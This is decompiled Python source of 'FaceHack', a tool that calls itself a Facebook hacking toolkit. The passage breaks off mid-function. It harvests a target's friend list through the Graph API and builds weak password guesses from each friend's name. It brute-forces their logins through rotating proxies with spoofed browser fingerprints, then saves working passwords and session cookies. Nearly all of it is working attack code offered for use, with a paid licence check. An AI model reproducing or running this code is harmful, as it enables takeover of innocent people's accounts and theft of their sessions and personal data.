""" Decompiled by Exotic Hridoy """

R="[#ff080c]"
G="[#15ff20]"
Y="[#ffe013]"
B="[#0d14ff]"
P="[#ad00f9]"
D="[#717171]"
W="[#dedede]"
try:
    import os,re,bs4,sys,time,json,uuid,hmac,random,base64,urllib,urllib3,struct,hashlib,binascii,datetime,calendar,requests,licensing,httpagentparser
    from shutil import which
    from bs4 import BeautifulSoup as Parser
    from datetime import datetime,timedelta
    from rich import print
    from rich.console import Console
    from rich.progress import Progress
    from rich.traceback import install
    from licensing.models import*
    from licensing.methods import Key,Helpers
    from concurrent.futures import ThreadPoolExecutor
    from urllib3.exceptions import InsecureRequestWarning
    requests.urllib3.disable_warnings(InsecureRequestWarning)
    input=Console().input
    install()
except(ModuleNotFoundError)as error:
    print(f'ERROR: {str(error).lower()}')
    exit(1)
def banner():
    print(f'\n{W}  ▓██████▒▄▄▄▄   ')
    print(f'{W}  ▓██   ▒▓█████▄ ')
    print(f'{W}  ▒████ ░▒██▒ ▄██ {W} │ {G}FaceHack {R}-{Y} v1.0.1 {W}({G}BETA{W})')
    print(f'{W}  ░▓█▒  ░▒██░█▀   {W} │ {W}Facebook Hacking Toolkit by @{R}iqbalmh18{W}')
    print(f'{W}  ░▒█░   ░▓█  ▀█▓ {W} │ {D}https://github.com/termuxhackers-id/facehack/{W}')
    print(f'{W}   ▒ ░   ░▒▓███▀▒')
    print(f'{W}   ░     ▒░▒   ░ ')
    print(f'{W}   ░ ░    ░    ░ ')
def useragent(ios=False):
    if(ios):
        return random.choice(open("data/ugen/iphones.txt","r").read().splitlines())
    return random.choice(open("data/ugen/android.txt","r").read().splitlines())
def wordlist(name):
    data=[]
    word=name.split(" ")
    if len(word[0])>3:
        data.append(word[0]+"123")
        data.append(word[0]+"12345")
    data.append(name)
    data.append(name.replace(" ","")+"123")
    data.append(name.replace(" ","")+"12345")
    return list(set(data))
def getproxy(sock=False):
    data=[]
    link="https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all"
    sock="socks5" if sock is not False else "socks4"
    resp=requests.get(link.format(sock),stream=True)
    for line in resp.iter_lines():data.append(line.decode())
    return data
def license():
    file="data/auth/license.key"
    code=str(Helpers.GetMachineCode(v=2))
    nohp="6289669529553"
    data=[{
        "id":"23940",
        "token":"WyI3NDIzNTM5NSIsIkhDam1TcGtLcDZFQWhmbkE1eVNPTzFMUGNwd0pLT3k4S3ErdmxLQVgiXQ==",
        "pubkey":"<RSAKeyValue><Modulus>vQ2MWKd8dznr3fWMNxiyecpxBA1kK4VV5Wpe+zFDMbMCkp3F4aNVREbbYkFncjbtq5Xy4TVGXI36GIcsjmif5OXuELB+jtOMN4HussjYg26DUDYiVCtlcC7+RCmHqCWLpwd9Do7S5dabWYHFx65WTon+dRVqokwxujndyJT8X2euDMVQpwfH8Y1ksl+y0xOV47w5sh7GCNifLDos6c5prwhEW5igo5GeyC+bajgjmSV3El2KAYkf4rsFHAFn4mCvtYrkOGEP/EeDBORRk1lWDFWnjjhtvfpNaX0lUKpcRDwyCaBlSPpOJNAJ/hqzUmKk3DTBxPNKironsd/+s3RcuQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
}]
    try:
        keys=open(file,"r").read()
    except(FileNotFoundError):
        print(f'\n  LICENSE KEY OF FACEHACK\n')
        print(f'  this tool is require premium license key')
        print(f'  buy premium license key to unlock all features')
        print(f'  and increase the limit for dump and results\n')
        print(f'  {W}1. buy premium license key')
        print(f'  {W}2. use premium license key')
        print(f'  {W}3. exit\n')
        while True:
            menu=str(input(f'  select menu: '))
            if menu=="1":
                link="https://wa.me/"+nohp+"?text=register+facehack+v1.0.1+BETA+*"+code+"*"
                print(f'  please open the link or copy all link and send to author')
                if which("xdg-open"):os.system(f'xdg-open {link}')
                print(f'\n{Y}{link}{W}\n')
                break
            elif menu=="2":break
            elif menu=="3":exit(1)
            else:continue
        keys=str(input(f'  {W}enter license key{W}: '))
    for line in data:
        try:
            resp=Key.activate(token=line["token"],rsa_pub_key=line["pubkey"],product_id=line["id"],key=keys,machine_code=code)
            if resp[0]is not None and Helpers.IsOnRightMachine(resp[0],v=2):
                with open(file,"a")as f:
                    f.truncate(0)
                    f.write(keys)
                    f.close()
                return{
                    "license":keys,
                    "premium":resp[0].f2,
                    "userkey":resp[0].notes,
                    "created":str(resp[0].created),
                    "expires":str(resp[0].expires),
}
            else:continue
        except Exception as e:
            print(f'\n  {R}error: {str(e)}{W}\n')
            exit(1)
    if os.path.isfile(file):os.remove(file)
    print(f'\n  {R}failed to activate license key{W}\n')
    exit(1)
class facehack:
    def __init__(self):
        self.keys=license()
        self.auth=self.auth_login()
        self.sock={"socks4":getproxy(False),"socks5":getproxy(True)}
    def auth_login(self):
        file="data/auth/cookies.txt"
        if os.path.isfile(file):
            cookie=open(file,"r").read()
        else:
            print(f'\n  {W}LOGIN TO FACEBOOK\n')
            print(f'  {W}this tool is require facebook cookies')
            print(f'  {W}to generate token and access graph API\'s\n')
            print(f'  {W}1. login to facebook on chrome or kiwi browser')
            print(f'  {W}2. open new tab and search "cookiedough" extension')
            print(f'  {W}3. install the extension and open previous tab')
            print(f'  {W}4. run cookiedough and get your own cookies\n')
            cookie=str(input(f'  facebook cookies: '))
        try:
            self.token=self.get_token_facebook(cookie)
            if(self.token):
                self.cookies={"cookie":cookie}
                resp=requests.get("https://graph.facebook.com/me?fields=id,name,email,gender,birthday&access_token="+self.token,cookies=self.cookies)
                data=json.loads(resp.text)
                with open(file,"a")as f:
                    f.truncate(0)
                    f.write(cookie)
                    f.close()
                return{
                        "id":str(data["id"]),
                        "name":data["name"],
                        "email":data["email"],
                        "gender":data["gender"],
                        "birthday":str(data["birthday"]),
}
            else:
                if os.path.isfile(file):os.remove(file)
                print(f'\n  {R}login failed cookies have been expires{W}\n')
                exit(1)
        except:
            if os.path.isfile(file):os.remove(file)
            exit(1)
    def get_token_facebook(self,cookie):
        with requests.Session()as r:
            try:
                r.headers.update({
                    "Host":"www.facebook.com",
                    "Accept":"*/*",
                    "Accept-Encoding":"gzip, deflate",
                    "Accept-Language":"id,en;q=0.9",
                    "Connection":"keep-alive",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
                    "Referer":"https://www.instagram.com/",
                    "Sec-Fetch-Mode":"cors",
                    "Sec-Fetch-Site":"cross-site",
                    "Sec-Fetch-Dest":"empty",
                    "Origin":"https://www.instagram.com",
})
                resp=r.get("https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",cookies={"cookie":cookie})
                return re.search("\"access_token\":\"(.*?)\"",str(resp.headers)).group(1)
            except:
                return False
    def get_friendlist_id(self,user_id):
        dump=[]
        ugen=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(109,116))}.0.0.0 Mobile Safari/537.36'
        with requests.Session()as r:
            try:
                r.headers.update({"User-Agent":ugen})
                data={"access_token":self.token,"fields":"friends"}
                resp=r.get(f'https://graph.facebook.com/{user_id}',params=data,cookies=self.cookies).json()
                for line in resp["friends"]["data"]:
                    try:
                        dump.append(line["id"]+"|"+line["name"])
                        print(f'  {W}collecting {str(len(dump))} id: {G}{str(line["id"])}{W}   ',end="\r")
                    except(requests.exceptions.JSONDecodeError,json.decoder.JSONDecodeError):continue
            except:
                print(W)
                return dump
        print(W)
        return dump
    def async_tiktok(self,user,name,password):
        with requests.Session()as r:
            self.process+=1
            progress.update(prog,description=f'  success: {G}{str(len(self.success))}{W} checked: {Y}{str(len(self.checked))}{W} process: {R}{str(self.process)}{W}',advance=1)
            file_success="data/rest/success-"+str(time.strftime("%d%m%y"))+".txt"
            file_checked="data/rest/checked-"+str(time.strftime("%d%m%y"))+".txt"
            ugen=useragent(False)
            usag=httpagentparser.detect(ugen)
            browser=usag["browser"]["name"]
            browser_version=usag["browser"]["version"]
            devices=usag["platform"]["name"]
            devices_version=usag["platform"]["version"]
            r.headers.update({
                "Host":"m.facebook.com",
                "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-encoding":"gzip, deflate",
                "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control":"max-age=0",
                "dpr":"2.75",
                "sec-ch-prefers-color-scheme":"light",
                "sec-ch-ua":f'"Not)A;Brand";v="24","{browser}";v="{browser_version.split(".")[0]}"',
                "sec-ch-ua-full-version-list":f'"Not)A;Brand";v="24.0.0.0", "{browser}";v="{browser_version}"',
                "sec-ch-ua-mobile":"?1",
                "sec-ch-ua-platform":f'"{devices}"',
                "sec-ch-ua-platform-version":(f'"{devices_version}"'if "." in devices_version else f'"{devices_version}.0.0"'),
                "sec-fetch-dest":"document",
                "sec-fetch-mode":"navigate",
                "sec-fetch-site":"same-origin",
                "sec-fetch-user":"?1",
                "upgrade-insecure-requests":"1",
                "user-agent":ugen,
                "viewport-width":"980",
})
            login="https://m.facebook.com/login/device-based/login/async/?api_key=1862952583919182&auth_token=c3d5b2316c1c263c872ad7064e241a7a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1698494728845%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df218ed179bcbae8%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff2bbceafc67c5a8%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%26locale%3Den_US%26logger_id%3Df779ac65a472%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df5c60723fab8bc%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff2bbceafc67c5a8%2526relation%253Dopener%2526frame%253Df37166359d319dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df5c60723fab8bc%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff2bbceafc67c5a8%26relation%3Dopener%26frame%3Df37166359d319dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100"
            referer="https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1698494728845%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df218ed179bcbae8%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff2bbceafc67c5a8%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%26locale%3Den_US%26logger_id%3Df779ac65a472%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df5c60723fab8bc%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff2bbceafc67c5a8%2526relation%253Dopener%2526frame%253Df37166359d319dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df5c60723fab8bc%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff2bbceafc67c5a8%26relation%3Dopener%26frame%3Df37166359d319dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
            resp=r.get(referer)
            cookie="; ".join([key+"="+value for key,value in r.cookies.get_dict().items()])+"; m_pixel_ratio=2.75; wd=393x780"
            lsd=re.search("name=\"lsd\" value=\"(.*?)\"",str(resp.text)).group(1)
            jazoest=re.search("name=\"jazoest\" value=\"(.*?)\"",str(resp.text)).group(1)
            m_ts=re.search("name=\"m_ts\" value=\"(.*?)\"",str(resp.text)).group(1)
            li=re.search("name=\"li\" value=\"(.*?)\"",str(resp.text)).group(1)
            fb_dtsg=re.search("{\"dtsg\":{\"token\":\"(.*?)\"",str(resp.content)).group(1)
            for pswd in password:
                try:
                    if len(pswd)<5:continue
                    else:pswd=pswd.lower()
                    encpass=f'#PWD_BROWSER:0:{int(str(datetime.datetime.now().timestamp()).split(".")[0])}:{pswd}'
                    r.headers.clear()
                    data="m_ts="+m_ts+"&li="+li+"&try_number=0&unrecognized_tries=0&email="+user+"&prefill_contact_point="+user+"&prefill_source=browser_dropdown&prefill_type=password&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=true&is_smart_lock=false&bi_xrwh=0&bi_wvdp=%7B%22hwc%22%3Atrue%2C%22hwcr%22%3Afalse%2C%22has_dnt%22%3Atrue%2C%22has_standalone%22%3Afalse%2C%22wnd_toStr_toStr%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22hasPerm%22%3Atrue%2C%22permission_query_toString%22%3A%22function%20query()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22permission_query_toString_toString%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22has_seWo%22%3Atrue%2C%22has_meDe%22%3Atrue%2C%22has_creds%22%3Atrue%2C%22has_hwi_bt%22%3Afalse%2C%22has_agjsi%22%3Afalse%2C%22iframeProto%22%3A%22function%20get%20contentWindow()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22remap%22%3Afalse%2C%22iframeData%22%3A%7B%22hwc%22%3Atrue%2C%22hwcr%22%3Afalse%2C%22has_dnt%22%3Atrue%2C%22has_standalone%22%3Afalse%2C%22wnd_toStr_toStr%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22hasPerm%22%3Atrue%2C%22permission_query_toString%22%3A%22function%20query()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22permission_query_toString_toString%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22has_seWo%22%3Atrue%2C%22has_meDe%22%3Atrue%2C%22has_creds%22%3Atrue%2C%22has_hwi_bt%22%3Afalse%2C%22has_agjsi%22%3Afalse%7D%7D&encpass="+encpass+"&fb_dtsg="+fb_dtsg+"&jazoest="+jazoest+"&lsd="+lsd+"&__dyn=1KQEGiE5q2K14zVQ2mml3onxG6U4a2i5U4e0C86u7E39x60lW4o3Bw4Ewk9E4W0om78b87C1Jw20Ehw5Owk888C0NE2vwSw5Uwp834wmE2ew4Kwww4WwSyE1582ZwrU2pw8O0zUdE&__csr=&__req=6&__a=AYlQ_9xcJ7lYCORF2JPvAr58ec-pWORMVqnD2svz1P4o-Gu0ALYFl4nhtlITlfZCgLNj7s61ktOZk5F55FpY5w_V_QauxNfM_nGwyS9-Qt4esQ&__user=0"
                    r.headers.update({
                        "Host":"m.facebook.com",
                        "accept":"*/*",
                        "accept-encoding":"gzip, deflate, br",
                        "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type":"application/x-www-form-urlencoded",
                        "content-length":"291",
                        "dpr":"2.75",
                        "origin":"https://m.facebook.com",
                        "referer":referer,
                        "sec-ch-prefers-color-scheme":"light",
                        "sec-ch-ua":f'"Not)A;Brand";v="24","{browser}";v="{browser_version}"',
                        "sec-ch-ua-full-version-list":f'"Not)A;Brand";v="24.0.0.0", "{browser}";v="{browser_version}.0.{str(random.randint(5845,5899))}.{str(random.randint(72,99))}"',
                        "sec-ch-ua-mobile":"?1",
                        "sec-ch-ua-platform":f'"{devices}"',
                        "sec-ch-ua-platform-version":(f'"{devices_version}"'if "." in devices_version else f'"{devices_version}.0.0"'),
                        "sec-fetch-dest":"empty",
                        "sec-fetch-mode":"cors",
                        "sec-fetch-site":"same-origin",
                        "sec-fetch-user":"?1",
                        "upgrade-insecure-requests":"1",
                        "user-agent":ugen,
                        "viewport-width":"393",
                        "x-asbd-id":"129477",
                        "x-fb-lsd":lsd,
})
                    prox={"http":"socks4://"+random.choice(self.sock["socks4"])}
                    post=r.post(login,data=data,proxies=prox,allow_redirects=False)
                    if "c_user" in r.cookies.get_dict().keys():
                        if user in self.success:break
                        self.success.append(user)
                        cookie="; ".join([key+"="+value for key,value in r.cookies.get_dict().items()])
                        open(file_success,"a").write(user+"|"+pswd+"|"+cookie+"\n")
                        print(f'  {G}LOGIN SUCCESS{R}\n')
                        print(f'  {G}fullname{W}: {name}')
                        print(f'  {G}username{W}: {user}')
                        print(f'  {G}password{W}: {pswd}')
                        print(f'  {G}saved as{W}: {R}{file_success}{W}')
                        print(f'  {G}fbcookie{W}: {D}{cookie}{W}\n')
                        try:
                            r.headers.clear()
                            resp=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
                            soup=Parser(resp,"html.parser")
                            for line in soup.find_all("h3"):
                                if "Ditambahkan" in line.text:
                                    line=line.text.replace("Ditambahkan pada"," added since")
                                    print(f'  {line} ({G}active{w})     ')
                                else:continue 
                            resp=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
                            soup=Parser(resp,"html.parser")
                            for line in soup.find_all("h3"):
                                if "Kedaluwarsa" in line.text:
                                    line=line.text.replace("Kedaluwarsa pada"," expires since")
                                    print(f'  {line} ({R}inactive{W})     ')
                                else:continue 
                        except:break
                        break
                    elif "checkpoint" in r.cookies.get_dict().keys():
                        if user in self.checked:break
                        self.checked.append(user)
                        open(file_checked,"a").write(user+"|"+pswd+"\n")
                        print(f'  {Y}LOGIN CHECKED{R}\n')
                        print(f'  {Y}fullname{W}: {name}')
                        print(f'  {Y}username{W}: {user}')
                        print(f'  {Y}password{W}: {pswd}')
                        print(f'  {Y}saved as{W}: {R}{file_checked}{W}\n')
                        break
                    else:
                        continue
                except(requests.exceptions.ConnectionError):
                    print(f'{R}  no internet connection waiting for connection stable   ',end="\r")
                    time.sleep(30)
                except(KeyboardInterrupt):exit(1)
    def async_instagram(self,user,name,password):
        with requests.Session()as r:
            self.process+=1
            progress.update(prog,description=f'  success: {G}{str(len(self.success))}{W} checked: {Y}{str(len(self.checked))}{W} process: {R}{str(self.process)}{W}',advance=1)
            file_success="data/rest/success-"+str(time.strftime("%d%m%y"))+".txt"
            file_checked="data/rest/checked-"+str(time.strftime("%d%m%y"))+".txt"
            ugen=useragent(False)
            usag=httpagentparser.detect(ugen)
            browser=usag["browser"]["name"]
            browser_version=usag["browser"]["version"]
            devices=usag["platform"]["name"]
            devices_version=usag["platform"]["version"]
            r.headers.update({
                "Host":"m.facebook.com",
                "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-encoding":"gzip, deflate",
                "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control":"max-age=0",
                "dpr":"2.75",
                "sec-ch-prefers-color-scheme":"light",
                "sec-ch-ua":f'"Not)A;Brand";v="24","{browser}";v="{browser_version.split(".")[0]}"',
                "sec-ch-ua-full-version-list":f'"Not)A;Brand";v="24.0.0.0", "{browser}";v="{browser_version}"',
                "sec-ch-ua-mobile":"?1",
                "sec-ch-ua-platform":f'"{devices}"',
                "sec-ch-ua-platform-version":(f'"{devices_version}"'if "." in devices_version else f'"{devices_version}.0.0"'),
                "sec-fetch-dest":"document",
                "sec-fetch-mode":"navigate",
                "sec-fetch-site":"same-origin",
                "sec-fetch-user":"?1",
                "upgrade-insecure-requests":"1",
                "user-agent":ugen,
                "viewport-width":"980",
})
            login="https://m.facebook.com/login/device-based/login/async/?api_key=124024574287414&auth_token=02aff1504a4c4bc4a62052fabb1ee74e&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221occ0uyn38zx1h1wnkro6uvx6d2vr8oh4qnrg1ss02vkm750wa%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df729282e-23af-430d-b0ae-95d1c5848331%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221occ0uyn38zx1h1wnkro6uvx6d2vr8oh4qnrg1ss02vkm750wa%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100"
            referer="https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221occ0uyn38zx1h1wnkro6uvx6d2vr8oh4qnrg1ss02vkm750wa%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df729282e-23af-430d-b0ae-95d1c5848331%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221occ0uyn38zx1h1wnkro6uvx6d2vr8oh4qnrg1ss02vkm750wa%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
            resp=r.get(referer)
            cookie="; ".join([key+"="+value for key,value in r.cookies.get_dict().items()])+"; m_pixel_ratio=2.75; wd=393x780"
            lsd=re.search("name=\"lsd\" value=\"(.*?)\"",str(resp.text)).group(1)
            jazoest=re.search("name=\"jazoest\" value=\"(.*?)\"",str(resp.text)).group(1)
            m_ts=re.search("name=\"m_ts\" value=\"(.*?)\"",str(resp.text)).group(1)
            li=re.search("name=\"li\" value=\"(.*?)\"",str(resp.text)).group(1)
            fb_dtsg=re.search("{\"dtsg\":{\"token\":\"(.*?)\"",str(resp.content)).group(1)
            for pswd in password:
                try:
                    if len(pswd)<5:continue
                    else:pswd=pswd.lower()
                    encpass=f'#PWD_BROWSER:0:{int(str(datetime.datetime.now().timestamp()).split(".")[0])}:{pswd}'
                    r.headers.clear()
                    data="m_ts="+m_ts+"&li="+li+"&try_number=0&unrecognized_tries=0&email="+user+"&prefill_contact_point="+user+"&prefill_source=browser_dropdown&prefill_type=password&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=true&is_smart_lock=false&bi_xrwh=0&bi_wvdp=%7B%22hwc%22%3Atrue%2C%22hwcr%22%3Afalse%2C%22has_dnt%22%3Atrue%2C%22has_standalone%22%3Afalse%2C%22wnd_toStr_toStr%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22hasPerm%22%3Atrue%2C%22permission_query_toString%22%3A%22function%20query()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22permission_query_toString_toString%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22has_seWo%22%3Atrue%2C%22has_meDe%22%3Atrue%2C%22has_creds%22%3Atrue%2C%22has_hwi_bt%22%3Afalse%2C%22has_agjsi%22%3Afalse%2C%22iframeProto%22%3A%22function%20get%20contentWindow()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22remap%22%3Afalse%2C%22iframeData%22%3A%7B%22hwc%22%3Atrue%2C%22hwcr%22%3Afalse%2C%22has_dnt%22%3Atrue%2C%22has_standalone%22%3Afalse%2C%22wnd_toStr_toStr%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22hasPerm%22%3Atrue%2C%22permission_query_toString%22%3A%22function%20query()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22permission_query_toString_toString%22%3A%22function%20toString()%20%7B%20%5Bnative%20code%5D%20%7D%22%2C%22has_seWo%22%3Atrue%2C%22has_meDe%22%3Atrue%2C%22has_creds%22%3Atrue%2C%22has_hwi_bt%22%3Afalse%2C%22has_agjsi%22%3Afalse%7D%7D&encpass="+encpass+"&fb_dtsg="+fb_dtsg+"&jazoest="+jazoest+"&lsd="+lsd+"&__dyn=1KQEGiE5q2K14zVQ2mml3onxG6U4a2i5U4e0C8dEc8uwcC4o1nEhwem0iy1gCwjE1xoswIwuo6S082x60na1gwwyo36w9-3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fwSw&__csr=&__req=8&__a=AYlQ1hPf5t9ObCDMNDfGHhTwgaEWbB_vvq97FPLEh-HIMwMFXJuZSE80R5vTvoXEUG-kUA0UtucnUMwpZMlCikrpyr2QaVf1iKwlDA9nF4-NTA&__user=0"
                    r.headers.update({
                        "Host":"m.facebook.com",
                        "accept":"*/*",
                        "accept-encoding":"gzip, deflate, br",
                        "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type":"application/x-www-form-urlencoded",
                        "content-length":str(random.randint(567,2071)),
                        "dpr":"2.75",
                        "origin":"https://m.facebook.com",
                        "referer":referer,
                        "sec-ch-prefers-color-scheme":"light",
                        "sec-ch-ua":f'"Not)A;Brand";v="24","{browser}";v="{browser_version}"',
                        "sec-ch-ua-full-version-list":f'"Not)A;Brand";v="24.0.0.0", "{browser}";v="{browser_version}.0.{str(random.randint(5845,5899))}.{str(random.randint(72,99))}"',
                        "sec-ch-ua-mobile":"?1",
                        "sec-ch-ua-platform":f'"{devices}"',
                        "sec-ch-ua-platform-version":(f'"{devices_version}"'if "." in devices_version else f'"{devices_version}.0.0"'),
                        "sec-fetch-dest":"empty",
                        "sec-fetch-mode":"cors",
                        "sec-fetch-site":"same-origin",
                        "sec-fetch-user":"?1",
                        "upgrade-insecure-requests":"1",
                        "user-agent":ugen,
                        "viewport-width":"393",
                        "x-asbd-id":"129477",
                        "x-fb-lsd":lsd,
})
                    prox={"http":"socks4://"+random.choice(self.sock["socks4"])}
                    post=r.post(login,data=data,proxies=prox,allow_redirects=False)
                    if "c_user" in r.cookies.get_dict().keys():
                        if user in self.success:break
                        self.success.append(user)
                        cookie="; ".join([key+"="+value for key,value in r.cookies.get_dict().items()])
                        open(file_success,"a").write(user+"|"+pswd+"|"+cookie+"\n")
                        print(f'  {G}LOGIN SUCCESS{R}\n')
                        print(f'  {G}fullname{W}: {name}')
                        print(f'  {G}username{W}: {user}')
                        print(f'  {G}password{W}: {pswd}')
                        print(f'  {G}saved as{W}: {R}{file_success}{W}')
                        print(f'  {G}fbcookie{W}: {D}{cookie}{W}\n')
                        try:
                            r.headers.clear()
                            resp=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
                            soup=Parser(resp,"html.parser")
                            for line in soup.find_all("h3"):
                                if "Ditambahkan" in line.text:
                                    line=line.text.replace("Ditambahkan pada"," added since")
                                    print(f'  {line} ({G}active{w})     ')
                                else:continue 
                            resp=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
                            soup=Parser(resp,"html.parser")
                            for line in soup.find_all("h3"):
